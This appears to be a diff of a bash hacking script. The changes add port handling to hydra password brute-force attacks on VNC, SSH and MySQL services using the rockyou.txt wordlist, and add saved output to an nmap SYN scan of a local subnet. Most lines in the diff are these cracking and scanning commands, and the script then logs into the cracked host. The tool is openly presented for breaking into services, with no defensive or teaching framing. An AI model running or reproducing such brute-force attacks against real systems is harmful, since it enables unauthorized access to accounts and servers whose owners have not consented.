@@ -117,7 +117,7 @@ else
 
                 else
                     # Scan specific port
-                    sudo nmap -sS 192.168.1.1/24 -p $service --open
+                    sudo nmap -sS 192.168.1.1/24 -p $service -oN $service --open
                 fi
             }
 
@@ -129,6 +129,7 @@ else
                 echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
                 read -p "Input Username: " user
                 read -p "Input Hostname: " host
+                read -p "Input Port: " port
             }
 
             RunHackingCommandWithVNC() {
@@ -143,7 +144,7 @@ else
                     # it will continue as normal
                     else
                         # Crack VNC password
-                        hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
+                        hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host:$port
                         # Alerts the user that the computer is trying to connect to the VNC server
                         title="Connecting to ${host}"
                         Connecting_To_VNC_SERVER="We are connecting you to '${host}'. Please wait..."
@@ -180,7 +181,7 @@ else
                     else
 
                         # Crack SSH password
-                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
+                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
                         # Alerts the user that the computer is trying to connect to the ssh server
                         title="Connecting to ${user}"
                         Connecting_To_SSH_SERVER="We are connecting you to ${user}. Please wait..."
@@ -194,7 +195,7 @@ else
                         Connected_To_SSH_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
                         echo "${title}"
                         echo "${Connected_To_SSH_SERVER}"
-                        ssh $user@$host
+                        ssh $user@$host -p $port
                     fi
                 fi
             }
@@ -211,7 +212,7 @@ else
                     # it will continue as normal
                     else
                         # Crack MySQL password
-                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host
+                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
                         echo "Loading MySQL server..."
                         sleep 3
                         mysql -u $user -p -A
